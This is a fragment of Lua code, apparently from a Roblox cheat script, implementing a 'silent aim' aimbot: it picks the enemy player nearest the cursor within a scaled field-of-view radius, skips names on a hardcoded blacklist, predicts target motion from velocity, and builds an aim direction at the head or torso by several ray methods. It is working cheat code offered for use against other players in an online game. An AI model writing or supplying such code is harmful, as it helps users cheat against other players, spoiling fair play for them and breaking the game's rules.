local CALIBRATED_FOV = 70
local function getVisualRadius(r)
    local fov = Camera.FieldOfView
    return r * (math.tan(math.rad(fov/2)) / math.tan(math.rad(CALIBRATED_FOV/2)))
end

local saModelCache = {}
local saModelFrame = 0
local function getTargetInFOV(radius)
    local mousePos = UserInputService:GetMouseLocation()
    local closest, closestDist = nil, math.huge
    saModelFrame += 1
    if saModelFrame >= 6 then
        saModelFrame = 0
        for _, p in pairs(Players:GetPlayers()) do
            if p == LocalPlayer then continue end
            local ok, m = pcall(function() return getModel:Invoke(p) end)
            saModelCache[p] = (ok and m) or nil
        end
        for p in pairs(saModelCache) do
            if not p.Parent then saModelCache[p] = nil end
        end
    end
    for _, p in pairs(Players:GetPlayers()) do
        if p == LocalPlayer then continue end
        
        -- HARDCODED BLACKLIST CHECK - Skip blacklisted players
        if SA_BLACKLIST[p.Name:lower()] then
            continue  -- Silent aim won't target this player
        end
        
        local model = saModelCache[p]
        if not model then continue end
        local humanoid = model:FindFirstChild("Humanoid")
        if not humanoid or humanoid.Health <= 0 then continue end
        local root = model:FindFirstChild("HumanoidRootPart") or model.PrimaryPart
        if not root then continue end
        local sp = Camera:WorldToViewportPoint(root.Position)
        if sp.Z <= 0 then continue end
        local d = (Vector2.new(sp.X, sp.Y) - mousePos).Magnitude
        if d <= radius and d < closestDist then
            closestDist = d; closest = p
        end
    end
    return closest
end

local function predictPosition(model, aimPart, origin, speed)
    local root = model:FindFirstChild("HumanoidRootPart") or aimPart
    local vel = root.AssemblyLinearVelocity or Vector3.zero
    if vel.Magnitude < 1 then return aimPart.Position end
    if not (Toggles.Prediction and Toggles.Prediction.Value) then return aimPart.Position end
    local t = (aimPart.Position - origin).Magnitude / speed
    return aimPart.Position + Vector3.new(vel.X, 0, vel.Z) * t
end

local function buildAimCFrame(originCF, speed)
    if not locked_player then return nil end
    local model = getModel:Invoke(locked_player)
    if not model or not model.Parent then return nil end
    if model:IsDescendantOf(Lighting) then return nil end
    local headLock = Toggles.HeadLock and Toggles.HeadLock.Value
    local aimPart = headLock
        and (model:FindFirstChild("Head") or model:FindFirstChild("Torso") or model.PrimaryPart)
        or  (model:FindFirstChild("Torso") or model:FindFirstChild("Head") or model.PrimaryPart)
    if not aimPart then return nil end
    local aimPos = predictPosition(model, aimPart, originCF.Position, speed)
        + Vector3.new(0, headLock and 0.1 or 0.35, 0)
    local method = Options.SAMethod and Options.SAMethod.Value or "FindPartOnRay"
    if method == "CFrame LookAt" then
        return CFrame.lookAt(originCF.Position, aimPos)
    elseif method == "ViewportPointToRay" or method == "ScreenPointToRay" then
        local dir = (aimPos - originCF.Position).Unit
        return CFrame.new(originCF.Position, originCF.Position + dir)
    elseif method == "Ray.new" then
        local dir = (aimPos - originCF.Position).Unit
        local ray = Ray.new(originCF.Position, dir * 5000)
        return CFrame.new(ray.Origin, ray.Origin + ray.Direction.Unit)
    elseif method == "FindPartOnRay" then
        local dir = (aimPos - originCF.Position).Unit
        local ray = Ray.new(originCF.Position, dir * 5000)
        local myModel = getModel:Invoke(LocalPlayer)
        local _, hitPos = workspace:FindPartOnRayWithIgnoreList(ray, {myModel, Camera})
        return CFrame.new(originCF.Position, hitPos or aimPos)
    end
    return CFrame.lookAt(originCF.Position, aimPos)
end

